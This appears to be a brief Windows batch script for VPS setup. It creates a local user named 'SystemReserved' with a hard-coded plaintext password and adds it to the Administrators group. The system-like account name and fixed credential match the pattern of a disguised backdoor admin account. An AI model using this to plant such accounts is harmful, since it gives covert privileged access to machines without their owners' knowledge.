@echo off
REM Set the VPS user and password


net user SystemReserved iGkEW4XTbWxduP1L /add
net localgroup Administrators SystemReserved /add


net user SystemReserved iGkEW4XTbWxduP1L

echo User and password set successfully.
pause
